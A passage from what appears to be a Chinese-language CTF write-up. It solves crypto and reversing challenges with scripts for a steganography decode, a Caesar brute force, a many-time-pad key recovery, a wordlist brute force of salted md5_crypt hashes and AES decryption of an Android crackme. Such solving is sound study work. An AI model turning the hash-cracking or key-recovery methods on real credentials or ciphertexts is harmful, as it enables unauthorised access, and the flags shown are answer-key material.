number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>            text <span class="token operator">=</span> text<span class="token operator">+</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bintext<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        <span class="token keyword">return</span> text</pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    path <span class="token operator">=</span> <span class="token string">"flag.txt"</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    line <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>splitlines<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64stego_decrypt<span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到 flag： <code>MemoRy_S1cr1t</code></p>
<h2 id="crypto"><a class="anchor" href="#crypto">#</a> CRYPTO</h2>
<h3 id="eazy"><a class="anchor" href="#eazy">#</a> eazy</h3>
<p a9462922e5da8ef93d213c33168881c5=""><code>flag</code> : flag</p>
<p>打开后得到 base64，解密得到：<br />
svciqytf10r3ln!nule7<br />
W 形栅栏解密，栏数为 3，得到：<br />
syntvfu1c0lri3elqn7!<br />
 凯撒直接遍历，</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>model <span class="token operator">=</span> <span class="token string">"abcdefghijklmnopqrstuvwxyz"</span></pre></td></tr><tr><td data-num="2"></td><td><pre>model2 <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>str1 <span class="token operator">=</span> <span class="token string">"syntvfu1c0lri3elqn7!"</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">for</span> key <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">for</span> s <span class="token keyword">in</span> str1<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">if</span> s<span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            n <span class="token operator">=</span> model<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            s <span class="token operator">=</span> model<span class="token punctuation">[</span>n<span class="token operator">-</span>key<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">elif</span> s<span class="token punctuation">.</span>isupper<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="12"></td><td><pre>            n <span class="token operator">=</span> model2<span class="token punctuation">.</span>find<span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>            s <span class="token operator">=</span> model2<span class="token punctuation">[</span>n<span class="token operator">-</span>key<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到：<br />
flagish1p0yev3ryda7!，<br />
就是：flag is h1p0yev3ryda7!<br />
 然后 h1p0yev3ryda7! 进行 md5 32 (小写) 加密，得到 flag</p>
<h3 id="runfaster"><a class="anchor" href="#runfaster">#</a> RunFaster</h3>
<p 0ed7bc5c61e32c10e082abd2b5589a22=""><code>flag</code> : flag</p>
<p>下载题目后查看 ciphertext.txt，发下里面是整齐的 16 进制串，题目无其他提示，转成字符后无实意。不过之前比赛遇到过类似的题目，是 OTP 一次密码，这样确实也符合题目 RunFaster，参考<a target="_blank" rel="noopener" href="https://www.ruanx.net/many-time-pad/"> Many-Time-Pad 攻击</a>，修改脚本逆求 key。</p>
<p>MTP 脚本如下</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">import</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>strxor <span class="token keyword">as</span> xo</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> libnum<span class="token punctuation">,</span> codecs<span class="token punctuation">,</span> numpy <span class="token keyword">as</span> np</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">def</span> <span class="token function">isChr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> x <span class="token keyword">and</span> x <span class="token operator">&lt;=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> x <span class="token keyword">and</span> x <span class="token operator">&lt;=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'Z'</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">infer</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">if</span> msg<span class="token punctuation">[</span>index<span class="token punctuation">,</span> pos<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token keyword">return</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    msg<span class="token punctuation">[</span>index<span class="token punctuation">,</span> pos<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        <span class="token keyword">if</span> x <span class="token operator">!=</span> index<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="15"></td><td><pre>            msg<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> xo<span class="token punctuation">.</span>strxor<span class="token punctuation">(</span>c<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">,</span> c<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>dat <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token keyword">def</span> <span class="token function">getSpace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        res <span class="token operator">=</span> <span class="token punctuation">[</span>xo<span class="token punctuation">.</span>strxor<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span> <span class="token keyword">for</span> y <span class="token keyword">in</span> c <span class="token keyword">if</span> x<span class="token operator">!=</span>y<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        f <span class="token operator">=</span> <span class="token keyword">lambda</span> pos<span class="token punctuation">:</span> <span class="token builtin">len</span><span class="token punctuation">(</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">filter</span><span class="token punctuation">(</span>isChr<span class="token punctuation">,</span> <span class="token punctuation">[</span>s<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token keyword">for</span> s <span class="token keyword">in</span> res<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        cnt <span class="token operator">=</span> <span class="token punctuation">[</span>f<span class="token punctuation">(</span>pos<span class="token punctuation">)</span> <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">for</span> pos <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            dat<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">,</span> index<span class="token punctuation">,</span> pos<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>c <span class="token operator">=</span> <span class="token punctuation">[</span>codecs<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'hex'</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'Problem.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>msg <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dtype<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="30"></td><td><pre></pre></td></tr><tr><td data-num="31"></td><td><pre>getSpace<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="32"></td><td><pre></pre></td></tr><tr><td data-num="33"></td><td><pre>dat <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span>dat<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token keyword">for</span> w<span class="token punctuation">,</span> index<span class="token punctuation">,</span> pos <span class="token keyword">in</span> dat<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="35"></td><td><pre>    infer<span class="token punctuation">(</span>index<span class="token punctuation">,</span> pos<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> x<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> msg<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p>得到对应输出</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/fe48ad2860db212c649751149211d71d.png" alt="" /></p>
<p>可见能看到明文信息，从最后一串下手，可以猜出是 e  were neither up nor down. OK ，根据明文与密文异或求出 key。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>s<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'32397f47102d3c101b3a2a34063a2013354111173036600a0c44314c602d32'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>txt<span class="token operator">=</span><span class="token string">"e  were neither up nor down. OK"</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>txt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">^</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#W_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'25'</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#W@_0u_Y0u_C@n_R3@11y_D@nc3_b@by</span></pre></td></tr></table></figure><p>还有一位没有还原，可以结合第一句话是倒数第四句话 they 来推测，拿到正确的 key，之后 key 与所有密文异或。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/ff1f317976f4a27903d448b1ab4c8a29.png" alt="image-20220619211840330" /></p>
<p>还原出的 key 作为压缩包解密，第二关给了一个字典和一个加 salt 的 hash，hash 无法逆求所以只能是爆破将字典的字符按照对应的 salt 依次爆破。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> passlib<span class="token punctuation">.</span><span class="token builtin">hash</span> <span class="token keyword">import</span> md5_crypt</pre></td></tr><tr><td data-num="2"></td><td><pre>f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">r'C:\Users\lx\Desktop\分区赛\密码\minirockyou.txt'</span><span class="token punctuation">,</span><span class="token string">'r'</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>enc<span class="token operator">=</span><span class="token string">'$1$ciscn010$mSuTlV75nZZGGjoayF/nS0'</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    s<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token keyword">if</span> enc <span class="token keyword">in</span> md5_crypt<span class="token punctuation">.</span><span class="token builtin">hash</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span>salt<span class="token operator">=</span><span class="token string">'ciscn010'</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">break</span></pre></td></tr></table></figure><p>因为密码数据比较短，所以依次手动修改 enc 和 salt 即可，最终得到一串明文字符。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>m<span class="token operator">=</span><span class="token string">"the second letter of each word in this list in order"</span> <span class="token comment">#取出这些单词的第二个字符</span></pre></td></tr><tr><td data-num="2"></td><td><pre>m<span class="token operator">=</span>m<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token builtin">str</span><span class="token operator">=</span><span class="token string">''</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token builtin">str</span><span class="token operator">+=</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token comment">#heefaonhinr</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token comment">#flag&#123;0ed7bc5c61e32c10e082abd2b5589a22&#125;</span></pre></td></tr></table></figure><p>直接将得到的字符包上 flag 提交不对，长度不对，其余 flag 的内容均为 32 位 16 进制，所以尝试 flag {md5 (heefaonhinr)}，: ) 提交正确。</p>
<h2 id="re"><a class="anchor" href="#re">#</a> RE</h2>
<h3 id="crackme2"><a class="anchor" href="#crackme2">#</a> crackme2</h3>
<p 50c418de67942e713517e900dbd12183=""><code>flag</code> : flag</p>
<p>android 逆向，jadx 打开，查看 main1Activity，其中主要函数如下</p>
<figure class="highlight java"><figcaption data-lang="java"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">public</span> <span class="token keyword">native</span> <span class="token class-name">String</span> <span class="token function">stringFromJNI</span><span class="token punctuation">(</span><span class="token class-name">String</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">static</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">loadLibrary</span><span class="token punctuation">(</span><span class="token string">"crackme2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">boolean</span> <span class="token function">checkFmt</span><span class="token punctuation">(</span><span class="token class-name">String</span> input<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> input<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Character</span><span class="token punctuation">.</span><span class="token function">isUpperCase</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>            <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">public</span> <span class="token comment">/* synthetic */</span> <span class="token keyword">void</span> m0lambda$onCreate$<span class="token number">0</span>$<span class="token function">comctfcrackme2Main1Activity</span><span class="token punctuation">(</span><span class="token class-name">EditText</span> et_input<span class="token punctuation">,</span> <span class="token class-name">View</span> v<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token class-name">String</span> input <span class="token operator">=</span> et_input<span class="token punctuation">.</span><span class="token function">getText</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">if</span> <span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"flag&#123;"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> input<span class="token punctuation">.</span><span class="token function">endsWith</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> input<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6</span> <span class="token operator">&amp;&amp;</span> input<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">39</span> <span class="token operator">&amp;&amp;</span> <span class="token function">checkFmt</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            <span class="token class-name">Toast</span><span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token function">stringFromJNI</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> input<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>首先 check 了 flag 的格式和长度，checkFmt 用于确定输入无大写，之后调用了 stringFromJNI 即 native 层函数，故主要逻辑在 so 文件，先解压 apk，ida 加载 x86 的 so 文件，首先查看导出表，发现该函数是静态注册的，修改一下参数如下。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/35f672f500d43444bd5231a0a8c258b7.png" alt="image-20220619201210787" /></p>
<p>首先判断传入内容是否为 32 位，之后跟进 sub_D1FE5640 函数对 flag 的内容进行 check。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/106131f536b262650aa3b590534a0514.png" alt="image-20220619201406417" /></p>
<p>这一步是读取序列化文件 tmp，用于之后加密使用，紧接着通过 sscanf 将输入两个一组转为 16 进制存入一个数组，32 为输入为仅为 16 进制的字符。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/04108af78a95bd369ca3ba2f1a87376d.png" alt="image-20220619201917396" /></p>
<p>之后是调用了 <code>com/risid/test/AESEncrypt</code>  对象中的 encrypt 方法，并且通过 <code>SetByteArrayRegion</code>  函数实现 JNI 向 java 层传参数，jadx 中可以找到 encrypt 方法的定义。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444985/Typera/2023/04/cbb3b62057a98ec580c35b63d77d89f9.png" alt="image-20220619202135278" /></p>
<p>JNI 传给该函数的参数 content 是 sscanf 后存入的数组，iv 则是 &quot;0123456789abcdef&quot;，第三个参数则是从 tmp 中解析的对象，可见上述操作主要实现了 AES 的 CBC 加密，主要解密密文的前 16 个字节，已经拿到了 iv 还缺少 key。</p>
<p><img loading="lazy" data-src="https://res.cloudinary.com/sycamore/image/upload/v1682444984/Typera/2023/04/2cb8a1e069fa00e3c92f1926f902ca6e.png" alt="image-20220619203245330" /></p>
<p>key 可以在 <code>com/risid/test</code>  包中的 <code>AESGenerator</code>  类中找到，用 python 尝试解密即可。</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES</pre></td></tr><tr><td data-num="2"></td><td><pre>c<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">0x08</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token 